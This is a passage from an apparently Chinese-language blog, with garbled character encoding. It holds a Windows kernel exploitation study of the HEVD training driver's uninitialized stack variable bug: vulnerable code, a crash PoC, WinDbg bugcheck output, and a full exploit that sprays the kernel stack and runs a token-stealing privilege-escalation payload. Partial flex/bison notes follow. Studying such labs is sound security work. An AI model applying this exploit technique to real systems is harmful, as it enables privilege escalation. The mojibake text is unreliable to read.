UninitializedStackVariable = {0};#else // Vulnerability Note: This is a vanilla Uninitialized Stack Variable vulnerability // because the developer is not initializing 'UNINITIALIZED_STACK_VARIABLE' structure // before calling the callback when 'MagicValue' does not match 'UserValue' UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable;#endif PAGED_CODE(); __try { // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, sizeof(UNINITIALIZED_STACK_VARIABLE), (ULONG)__alignof(UNINITIALIZED_STACK_VARIABLE)); // Get the value from user mode UserValue = *(PULONG)UserBuffer; DbgPrint(&quot;[+] UserValue: 0x%p\\n&quot;, UserValue); DbgPrint(&quot;[+] UninitializedStackVariable Address: 0x%p\\n&quot;, &amp;UninitializedStackVariable); // Validate the magic value // å¦‚æœæˆ‘ä»¬ä¼ é€’çš„UserValueå’Œè¿™ä¸ªMagicVuleç›¸åŒæ‰ä¼šèµ°è¿™é‡Œã€‚ if (UserValue == MagicValue) { UninitializedStackVariable.Value = UserValue; UninitializedStackVariable.Callback = &amp;UninitializedStackVariableObjectCallback; } DbgPrint(&quot;[+] UninitializedStackVariable.Value: 0x%p\\n&quot;, UninitializedStackVariable.Value); DbgPrint(&quot;[+] UninitializedStackVariable.Callback: 0x%p\\n&quot;, UninitializedStackVariable.Callback);#ifndef SECURE DbgPrint(&quot;[+] Triggering Uninitialized Stack Variable Vulnerability\\n&quot;);#endif // Call the callback function //å¦‚æœå‰é¢UserValueå’ŒMageValueä¸ä¸€æ ·çš„æ—¶å€™ï¼Œcallbackæ²¡è¢«èµ‹å€¼çš„ï¼Œç›´æ¥è°ƒç”¨å°±ä¼šå‡ºé—®é¢˜ã€‚ if (UninitializedStackVariable.Callback) { UninitializedStackVariable.Callback(); } } __except (EXCEPTION_EXECUTE_HANDLER) { Status = GetExceptionCode(); DbgPrint(&quot;[-] Exception Code: 0x%X\\n&quot;, Status); } return Status;} æˆ‘ä»¬ä¼ é€’ä¸€ä¸ªéMagicValueçš„å€¼ï¼ŒUninitializedStackVariable.Callbackå°±æ˜¯ä¸€ä¸ªæœªå®šçš„å€¼ï¼Œåé¢ç›´æ¥è°ƒç”¨ï¼Œå°±å¯èƒ½ä¼šç›´æ¥å´©æºƒã€‚ 0x02:è°ƒè¯•è®¾ç½®å¥½win7 kernelè°ƒè¯•ç›¸å…³çš„è®¾ç½®ï¼ŒæŒ‚è½½ä¸Šé©±åŠ¨ã€‚PoCä»£ç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455HANDLE GetDeviceHandle(LPCSTR DeviceName){ HANDLE hDriver = CreateFileA(DeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); return hDriver;}int _tmain(int argc, _TCHAR* argv[]) { ULONG BytesReturned; HANDLE hFile = NULL; ULONG MagicValue = 0xBAADF00D; LPCSTR lpDeviceName = (LPCSTR)&quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; __try { hFile = GetDeviceHandle(lpDeviceName); if (hFile == INVALID_HANDLE_VALUE) { printf(&quot;\\t\\t[-] Failed Getting Device Handle: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { printf(&quot;\\t\\t[+] Device Handle: 0x%X\\n&quot;, hFile); } StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,StackSprayBufferSize); if(!StackSprayBuffer){ printf(&quot;Alloc buffer error : 0x%X&quot;,GetLastError()); } DeviceIoControl(hFile, HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE, (LPVOID)&amp;MagicValue, 0, NULL, 0, &amp;BytesReturned, NULL); HeapFree(GetProcessHeap(),0,(LPVOID)StackSprayBuffer); //set ptr NULL StackSprayBuffer = NULL; } __except (EXCEPTION_EXECUTE_HANDLER) { printf(&quot;\\t\\t[-] Exception: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } return 0;} Windbgè®¾ç½®å 1!gflag +soe ä¸ºäº†è°ƒè¯•åˆ°è§¦å‘vulnçš„éƒ¨åˆ†çš„ä»£ç ï¼Œé‡‡ç”¨çš„æ–¹å¼æ˜¯ç»“åˆIDAï¼ŒæŸ¥çœ‹å‡½æ•°çš„offsetï¼Œç»“åˆHEVDæ¨¡å—çš„åŠ è½½åŸºåœ°å€ï¼Œå»ä¸‹æ–­ç‚¹ï¼Œæ–­åœ¨æœ‰æ¼æ´çš„å‡½æ•°é‚£é‡Œã€‚ ä¹‹åæ•è·åˆ°crash 123456789101112131415161718192021222324252627282930313233343536373839404142kd&gt; !gflag +soeNew NtGlobalFlag contents: 0x00000001 soe - Stop On Exceptionkd&gt; gAccess violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.00000000 ?? ???kd&gt; dps esp9adb9ab0 75abe00b9adb9ab4 8eff4f94*** ERROR: Module load completed but symbols could not be loaded for HEVD.sys HEVD+0x4f949adb9ab8 1424bcc89adb9abc 87c869809adb9ac0 87c869f09adb9ac4 8eff5ca4 HEVD+0x5ca49adb9ac8 83ec88c8 nt!MiExchangeWsle+0x7c9adb9acc 75abe0059adb9ad0 0000014f9adb9ad4 00000000 ----&gt; CallBackå‡½æ•°9adb9ad8 c080327c9adb9adc 004330099adb9ae0 000000019adb9ae4 0000015d9adb9ae8 9adb9b149adb9aec 83ec8a26 nt!MiSwapWslEntries+0x14c9adb9af0 004330099adb9af4 0000014f9adb9af8 75abe0019adb9afc 0000014f9adb9b00 c08020009adb9b04 85da59289adb9b08 000000019adb9b0c 000000599adb9b10 000000009adb9b14 9adb9b409adb9b18 83ec6397 nt!MiUpdateWsle+0x12d9adb9b1c 0000014f9adb9b20 0000015d9adb9b24 85d6d6c09adb9b28 0000015d9adb9b2c 85d6d6c0 å¯ä»¥çœ‹åˆ°è°ƒç”¨äº† 0x00000000ï¼Œç„¶è€Œè¿™ä¸ªåœ°å€æ˜¯ä¸ªéæ³•åœ°å€ï¼Œæ‰€ä»¥crashã€‚æŒºå¥‡æ€ªçš„æ˜¯è¿™ä¸ªæ—¶å€™gå‘½ä»¤è¿˜å¯ä»¥ç»§ç»­èµ°â€¦æ‰€ä»¥æˆ‘åˆè·‘äº†ä¸€æ¬¡PoCã€‚æˆ‘ç¬¬äºŒæ¬¡è¿è¡ŒPoCè·å¾—çš„ä¿¡æ¯å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189kd&gt; !analyze -v******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************PAGE_FAULT_IN_NONPAGED_AREA (50)Invalid system memory was referenced. This cannot be protected by try-except.Typically the address is just plain bad or it is pointing at freed memory.Arguments:Arg1: ffffffdd, memory referenced.Arg2: 00000001, value 0 = read operation, 1 = write operation.Arg3: 59477005, If non-zero, the instruction address which referenced the bad memory address.Arg4: 00000000, (reserved)Debugging Details:------------------DUMP_CLASS: 1DUMP_QUALIFIER: 0BUILD_VERSION_STRING: 6.1.7600.16385 (win7_rtm.090713-1255)DUMP_TYPE: 0BUGCHECK_P1: ffffffffffffffddBUGCHECK_P2: 1BUGCHECK_P3: 59477005BUGCHECK_P4: 0WRITE_ADDRESS: ffffffdd FAULTING_IP: MSVCR110D!_ioinitCallback+1e559477005 0068dd add byte ptr [eax-23h],chMM_INTERNAL_CODE: 0CPU_COUNT: 1CPU_MHZ: af1CPU_VENDOR: GenuineIntelCPU_FAMILY: 6CPU_MODEL: 3cCPU_STEPPING: 3CPU_MICROCODE: 6,3c,3,0 (F,M,S,R) SIG: 1E'00000000 (cache) 1E'00000000 (init)DEFAULT_BUCKET_ID: WIN7_DRIVER_FAULTBUGCHECK_STR: 0x50PROCESS_NAME: test.exeCURRENT_IRQL: 2ANALYSIS_SESSION_HOST: MUHE-PCANALYSIS_SESSION_TIME: 02-04-2017 19:46:44.0573ANALYSIS_VERSION: 10.0.14321.1024 x86freTRAP_FRAME: 8d47ea40 -- (.trap 0xffffffff8d47ea40)ErrCode = 00000002eax=00000000 ebx=94f53ca4 ecx=0024f9f0 edx=00000065 esi=baadf00d edi=00000000eip=59477005 esp=8d47eab4 ebp=8d47ebd4 iopl=0 nv up ei pl nz na pe nccs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010206MSVCR110D!_ioinitCallback+0x1e5:59477005 0068dd add byte ptr [eax-23h],ch ds:0023:ffffffdd=??Resetting default scopeMISALIGNED_IP: MSVCR110D!_ioinitCallback+1e559477005 0068dd add byte ptr [eax-23h],chLAST_CONTROL_TRANSFER: from 83ee5e71 to 83e74394STACK_TEXT: 8d47e58c 83ee5e71 00000003 dbca9caa 00000065 nt!RtlpBreakWithStatusInstruction8d47e5dc 83ee696d 00000003 86557030 00000000 nt!KiBugCheckDebugBreak+0x1c8d47e9a0 83e8e8e3 00000050 ffffffdd 00000001 nt!KeBugCheck2+0x68b8d47ea28 83e4f5f8 00000001 ffffffdd 00000000 nt!MmAccessFault+0x1068d47ea28 59477005 00000001 ffffffdd 00000000 nt!KiTrap0E+0xdc8d47ebd4 94f52fe8 0024f9f0 8d47ebfc 94f53219 MSVCR110D!_ioinitCallback+0x1e5WARNING: Stack unwind information not available. Following frames may be wrong.8d47ebe0 94f53219 878eb928 878eb998 85d8bf80 HEVD+0x4fe88d47ebfc 83e454bc 878bbbb0 878eb928 878eb928 HEVD+0x52198d47ec14 84046eee 85d8bf80 878eb928 878eb998 nt!IofCallDriver+0x638d47ec34 84063cd1 878bbbb0 85d8bf80 00000000 nt!IopSynchronousServiceTail+0x1f88d47ecd0 840664ac 878bbbb0 878eb928 00000000 nt!IopXxxControlFile+0x6aa8d47ed04 83e4c42a 0000001c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a8d47ed04 76e464f4 0000001c 00000000 00000000 nt!KiFastCallEntry+0x12a0024f828 76e44cac 74fda08f 0000001c 00000000 ntdll!KiFastSystemCallRet0024f82c 74fda08f 0000001c 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc0024f88c 76c0ec25 0000001c 0022202f 0024f9f0 KERNELBASE!DeviceIoControl+0xf60024f8b8 013e1612 0000001c 0022202f 0024f9f0 kernel32!DeviceIoControlImplementation+0x800024fa34 013e1cc9 00000001 00350598 00351ba8 test+0x116120024fa84 013e1ebd 0024fa98 76c11174 7ffd4000 test+0x11cc90024fa8c 76c11174 7ffd4000 0024fad8 76e5b3f5 test+0x11ebd0024fa98 76e5b3f5 7ffd4000 76c02850 00000000 kernel32!BaseThreadInitThunk+0xe0024fad8 76e5b3c8 013e1082 7ffd4000 00000000 ntdll!__RtlUserThreadStart+0x700024faf0 00000000 013e1082 7ffd4000 00000000 ntdll!_RtlUserThreadStart+0x1bSTACK_COMMAND: kbTHREAD_SHA1_HASH_MOD_FUNC: b2a297aada69e6279fdc3daae6f4a22cf686509aTHREAD_SHA1_HASH_MOD_FUNC_OFFSET: 4f005ee17e97a074c7da84fec24b29c43a55219cTHREAD_SHA1_HASH_MOD: c3a8502bd33e9f58cfa688b5c9397c7eefe7acfaFOLLOWUP_IP: HEVD+4fe894f52fe8 5d pop ebpFAULT_INSTR_CODE: 8c25dSYMBOL_STACK_INDEX: 6SYMBOL_NAME: HEVD+4fe8FOLLOWUP_NAME: MachineOwnerIMAGE_NAME: hardwareDEBUG_FLR_IMAGE_TIMESTAMP: 0MODULE_NAME: hardwareFAILURE_BUCKET_ID: IP_MISALIGNEDBUCKET_ID: IP_MISALIGNEDPRIMARY_PROBLEM_CLASS: IP_MISALIGNEDTARGET_TIME: 2017-02-04T11:45:48.000ZOSBUILD: 7600OSSERVICEPACK: 16385SERVICEPACK_NUMBER: 0OS_REVISION: 0SUITE_MASK: 272PRODUCT_TYPE: 1OSPLATFORM_TYPE: x86OSNAME: Windows 7OSEDITION: Windows 7 WinNt TerminalServer SingleUserTSOS_LOCALE: USER_LCID: 0OSBUILD_TIMESTAMP: 2009-07-14 07:15:19BUILDDATESTAMP_STR: 090713-1255BUILDLAB_STR: win7_rtmBUILDOSVER_STR: 6.1.7600.16385ANALYSIS_SESSION_ELAPSED_TIME: 2f92ANALYSIS_SOURCE: KMFAILURE_ID_HASH_STRING: km:ip_misalignedFAILURE_ID_HASH: {201b0e5d-db2a-63d2-77be-8ce8ff234750}Followup: MachineOwner--------- è¿™é‡Œgä¹‹åå°±æ˜¯ç›´æ¥è“å±äº†ã€‚ 0x03:åˆ©ç”¨æ€è·¯å¤§è‡´çš„åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š å¸ƒç½®å†…æ ¸æ ˆ è§¦å‘æ¼æ´ ææƒ å…³äºå†…æ ¸æ ˆçš„å¸ƒç½®ï¼Œä½¿ç”¨çš„æ˜¯å‡ºè‡ªj00ruæ–‡ç« çš„æ–¹æ³•ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨äº†HEVDçš„exploitï¼Œæˆ‘åªåšä¸€ç‚¹åˆ†æã€‚ 0x04:Exploitåˆ†æHEVD é‡Œçš„ Exploitä»£ç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264#include &quot;UninitializedStackVariable.h&quot;VOID ResolveKernelAPIs() { PCHAR KernelImage; SIZE_T ReturnLength; HMODULE hNtDll = NULL; PVOID HalDispatchTable = NULL; HMODULE hKernelInUserMode = NULL; PVOID KernelBaseAddressInKernelMode; NTSTATUS NtStatus = STATUS_UNSUCCESSFUL; PSYSTEM_MODULE_INFORMATION pSystemModuleInformation; DEBUG_INFO(&quot;\\t\\t[+] Resolving Kernel APIs\\n&quot;); hNtDll = LoadLibrary(&quot;ntdll.dll&quot;); if (!hNtDll) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Load NtDll.dll: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, &quot;NtQuerySystemInformation&quot;); if (!NtQuerySystemInformation) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t\\t[+] NtQuerySystemInformation: 0x%p\\n&quot;, NtQuerySystemInformation); } NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(hNtDll, &quot;NtMapUserPhysicalPages&quot;); if (!NtMapUserPhysicalPages) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving NtMapUserPhysicalPages: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t\\t[+] NtMapUserPhysicalPages: 0x%p\\n&quot;, NtMapUserPhysicalPages); } NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &amp;ReturnLength); // Allocate the Heap chunk pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength); if (!pSystemModuleInformation) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } NtStatus = NtQuerySystemInformation(SystemModuleInformation, pSystemModuleInformation, ReturnLength, &amp;ReturnLength); if (NtStatus != STATUS_SUCCESS) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Module[0].Base; KernelImage = strrchr((PCHAR)(pSystemModuleInformation-&gt;Module[0].ImageName), '\\\\') + 1; hKernelInUserMode = LoadLibraryA(KernelImage); if (!hKernelInUserMode) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Load Kernel: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } ZwOpenProcess = (ZwOpenProcess_t)GetProcAddress(hKernelInUserMode, &quot;ZwOpenProcess&quot;); if (!ZwOpenProcess) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwOpenProcess: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess - (ULONG)hKernelInUserMode); ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwOpenProcess: 0x%p\\n&quot;, ZwOpenProcess); } ZwOpenProcessToken = (ZwOpenProcessToken_t)GetProcAddress(hKernelInUserMode, &quot;ZwOpenProcessToken&quot;); if (!ZwOpenProcessToken) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwOpenProcessToken: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken - (ULONG)hKernelInUserMode); ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwOpenProcessToken: 0x%p\\n&quot;, ZwOpenProcess); } ZwDuplicateToken = (ZwDuplicateToken_t)GetProcAddress(hKernelInUserMode, &quot;ZwDuplicateToken&quot;); if (!ZwDuplicateToken) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwDuplicateToken: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken - (ULONG)hKernelInUserMode); ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwDuplicateToken: 0x%p\\n&quot;, ZwDuplicateToken); } PsGetCurrentProcess = (PsGetCurrentProcess_t)GetProcAddress(hKernelInUserMode, &quot;PsGetCurrentProcess&quot;); if (!PsGetCurrentProcess) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving PsGetCurrentProcess: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess - (ULONG)hKernelInUserMode); PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] PsGetCurrentProcess: 0x%p\\n&quot;, PsGetCurrentProcess); } ZwSetInformationProcess = (ZwSetInformationProcess_t)GetProcAddress(hKernelInUserMode, &quot;ZwSetInformationProcess&quot;); if (!ZwSetInformationProcess) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwSetInformationProcess: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess - (ULONG)hKernelInUserMode); ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwSetInformationProcess: 0x%p\\n&quot;, ZwSetInformationProcess); } ZwClose = (ZwClose_t)GetProcAddress(hKernelInUserMode, &quot;ZwClose&quot;); if (!ZwClose) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwClose: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwClose = (ZwClose_t)((ULONG)ZwClose - (ULONG)hKernelInUserMode); ZwClose = (ZwClose_t)((ULONG)ZwClose + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwClose: 0x%p\\n&quot;, ZwClose); } HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation); if (hNtDll) { FreeLibrary(hNtDll); } if (hKernelInUserMode) { FreeLibrary(hKernelInUserMode); } hNtDll = NULL; hKernelInUserMode = NULL; pSystemModuleInformation = NULL;}DWORD WINAPI UninitializedStackVariableThread(LPVOID Parameter) { UINT32 i = 0; ULONG BytesReturned; HANDLE hFile = NULL; ULONG MagicValue = 0xBAADF00D; PULONG StackSprayBuffer = NULL; LPCSTR FileName = (LPCSTR)DEVICE_NAME; NTSTATUS NtStatus = STATUS_UNSUCCESSFUL; PVOID EopPayload = &amp;TokenStealingPayloadDuplicateToken; SIZE_T StackSprayBufferSize = 1024 * sizeof(ULONG_PTR); __try { DEBUG_MESSAGE(&quot;\\t[+] Setting Thread Priority\\n&quot;); if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) { DEBUG_ERROR(&quot;\\t\\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\\n&quot;); } else { DEBUG_INFO(&quot;\\t\\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\\n&quot;); } // Get the device handle DEBUG_MESSAGE(&quot;\\t[+] Getting Device Driver Handle\\n&quot;); DEBUG_INFO(&quot;\\t\\t[+] Device Name: %s\\n&quot;, FileName); hFile = GetDeviceHandle(FileName); if (hFile == INVALID_HANDLE_VALUE) { DEBUG_ERROR(&quot;\\t\\t[-] Failed Getting Device Handle: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t[+] Device Handle: 0x%X\\n&quot;, hFile); } DEBUG_MESSAGE(&quot;\\t[+] Setting Up Vulnerability Stage\\n&quot;); DEBUG_INFO(&quot;\\t\\t[+] Allocating Memory For Buffer\\n&quot;); StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, StackSprayBufferSize); if (!StackSprayBuffer) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Allocate Memory: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t\\t[+] Memory Allocated: 0x%p\\n&quot;, StackSprayBuffer); DEBUG_INFO(&quot;\\t\\t\\t[+] Allocation Size: 0x%X\\n&quot;, StackSprayBufferSize); } DEBUG_INFO(&quot;\\t\\t[+] Preparing Buffer Memory Layout\\n&quot;); //å¡«å……buffer for(i = 0; i &lt; StackSprayBufferSize / sizeof(ULONG_PTR); i++) { StackSprayBuffer[i] = (ULONG)EopPayload; } DEBUG_INFO(&quot;\\t\\t[+] EoP Payload: 0x%p\\n&quot;, EopPayload); //æ‰¾åˆ°NtMapUserPhysicalPages APIçš„åœ°å€ï¼Œåé¢è¦è°ƒç”¨ ResolveKernelAPIs(); DEBUG_INFO(&quot;\\t\\t[+] Spraying the Kernel Stack\\n&quot;); DEBUG_MESSAGE(&quot;\\t[+] Triggering Use of Uninitialized Stack Variable\\n&quot;); OutputDebugString(&quot;****************Kernel Mode****************\\n&quot;); // HackSys Extreme Vulnerable driver itself provides a decent interface // to spray the stack using Stack Overflow vulnerability. However, j00ru // on his blog disclosed a Windows API that can be used to spray stack up to // 1024*sizeof(ULONG_PTR) bytes (http://j00ru.vexillium.org/?p=769). Since, // it's a Windows API and available on Windows by default, I decided to use // it instead of this driver's Stack Overflow interface. //å–·å°„kernel stack NtMapUserPhysicalPages(NULL, 1024, StackSprayBuffer); // Kernel Stack should not be used for anything else as it // will corrupt the current sprayed state. So, we will directly // trigger the vulnerability without putting any Debug prints. //è§¦å‘æ¼æ´ DeviceIoControl(hFile, HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE, (LPVOID)&amp;MagicValue, 0, NULL, 0, &amp;BytesReturned, NULL); OutputDebugString(&quot;****************Kernel Mode****************\\n&quot;); HeapFree(GetProcessHeap(), 0, (LPVOID)StackSprayBuffer); StackSprayBuffer = NULL; } __except (EXCEPTION_EXECUTE_HANDLER) { DEBUG_ERROR(&quot;\\t\\t[-] Exception: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } return EXIT_SUCCESS;} 0x05: å‚è€ƒHEVD Kernel Exploitation â€“ Uninitialized Stack &amp; Heap By k0shlnt!NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques","link":"/2017/02/04/Windows-Kernel-Exploit-Study-3/"},{"title":"flex_bisonè¯»ä¹¦ç¬”è®°","text":"0x00: èµ·å› å·¥ä½œä¸Šçš„ä¸€äº›åŸå› éœ€è¦å­¦ä¹ ä¸€ä¸‹ã€‚åšä¸ªè®°å½•ç£ä¿ƒè‡ªå·±è¯»ä¹¦å­¦ä¹ ï¼Œå¥½å¥½å­¦ä¹ ã€‚ 0x01: ä¸€äº›æ¦‚å¿µè¯­å¥å’Œè¡¨è¾¾å¼ è¡¨è¾¾å¼ï¼ˆExpressionï¼‰æœ‰å€¼ï¼Œè€Œè¯­å¥ï¼ˆStatementï¼‰ä¸æ€»æœ‰ã€‚1234567è¡¨è¾¾å¼æ˜¯å¯ä»¥è¢«æ±‚å€¼çš„ä»£ç ï¼Œè€Œè¯­å¥æ˜¯ä¸€æ®µå¯æ‰§è¡Œä»£ç ã€‚å› ä¸ºè¡¨è¾¾å¼å¯è¢«æ±‚å€¼ï¼Œæ‰€ä»¥å®ƒå¯å†™åœ¨èµ‹å€¼è¯­å¥ç­‰å·çš„å³ä¾§ã€‚è€Œè¯­å¥ä¸ä¸€å®šæœ‰å€¼ï¼Œæ‰€ä»¥åƒimportã€forå’Œbreakç­‰è¯­å¥å°±ä¸èƒ½è¢«ç”¨äºèµ‹å€¼ã€‚Pythonçš„è¯­å¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼šç®€å•å’Œå¤åˆè¯­å¥ã€‚ç®€å•è¯­å¥æ˜¯æŒ‡ä¸€é€»è¾‘è¡Œçš„ä»£ç ã€‚ä¾‹å¦‚è¡¨è¾¾å¼è¯­å¥ã€èµ‹å€¼è¯­å¥å’Œreturnè¯­å¥ç­‰ã€‚å¤åˆè¯­å¥æ˜¯æŒ‡åŒ…å«ã€å½±å“æˆ–æ§åˆ¶ä¸€ç»„è¯­å¥çš„ä»£ç ã€‚ä¾‹å¦‚ifã€tryå’Œclassè¯­å¥ç­‰ã€‚è¡¨è¾¾å¼æœ¬èº«å¯ä»¥ä½œä¸ºè¡¨è¾¾å¼è¯­å¥ï¼Œä¹Ÿèƒ½ä½œä¸ºèµ‹å€¼è¯­å¥çš„å³å€¼æˆ–ifè¯­å¥çš„æ¡ä»¶ç­‰ï¼Œæ‰€ä»¥è¡¨è¾¾å¼å¯ä»¥ä½œä¸ºè¯­å¥çš„ç»„æˆéƒ¨åˆ†ï¼Œä½†ä¸æ˜¯å¿…é¡»æˆåˆ†ï¼ˆä¾‹å¦‚continueè¯­å¥ï¼‰ã€‚ å·¦é€’å½’ä¸€ä¸ªæ–‡æ³•æ˜¯å·¦é€’å½’çš„ï¼Œè‹¥æˆ‘ä»¬å¯ä»¥æ‰¾å‡ºå…¶ä¸­å­˜åœ¨æŸéç»ˆç«¯ç¬¦å·Aï¼Œæœ€ç»ˆä¼šæ¨å¯¼å‡ºæ¥çš„å¥å‹(sentential form)é‡Œé¢åŒ…å«ä»¥è‡ªå·±ä¸ºæœ€å·¦ç¬¦å·(left-symbol)çš„å¥å‹ ç›´æ¥å·¦é€’å½’ 1Expr ----&gt; Expr + Term ä¸¾ä¸ªä¾‹å­ï¼š 1A ---&gt; Aa|C é—´æ¥å·¦é€’å½’ 12A ---&gt; Ba|CB ---&gt; Ab|D è¿™ç§ä¼šäº§ç”Ÿï¼š 1A ---&gt; Ba ---&gt; Aba ---&gt; ... 0x02: é«˜çº§è®¡ç®—å™¨çš„å®ç°å…ˆçœ‹è¯­æ³•åˆ†æçš„éƒ¨åˆ†ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109$ cat fb3-2.y/* Companion source code for &quot;flex &amp; bison&quot;, published by O'Reilly * Media, ISBN 978-0-596-15597-1 * Copyright (c) 2009, Taughannock Networks. All rights reserved. * See the README file for license conditions and contact info. * $Header: /home/johnl/flnb/code/RCS/fb3-2.y,v 2.1 2009/11/08 02:53:18 johnl Exp $ *//* calculator with AST */%{# include &lt;stdio.h&gt;# include &lt;stdlib.h&gt;# include &quot;fb3-2.h&quot;%}%union { struct ast *a; double d; struct symbol *s; /* which symbol */ struct symlist *sl; int fn; /* which function */}/* declare tokens */ è¡¨æ˜ç±»å‹%token &lt;d&gt; NUMBER%token &lt;s&gt; NAME%token &lt;fn&gt; FUNC%token EOL%token IF THEN ELSE WHILE DO LET//rightã€leftè¡¨æ˜äº†ç»“åˆé¡ºåºï¼Œå³ä¼˜å…ˆçº§%nonassoc &lt;fn&gt; CMP%right '='%left '+' '-'%left '*' '/'%nonassoc '|' UMINUS//æŠŠå€¼&lt;a&gt;èµ‹å€¼ç»™äº† stmt list explist ä¸‰è€…%type 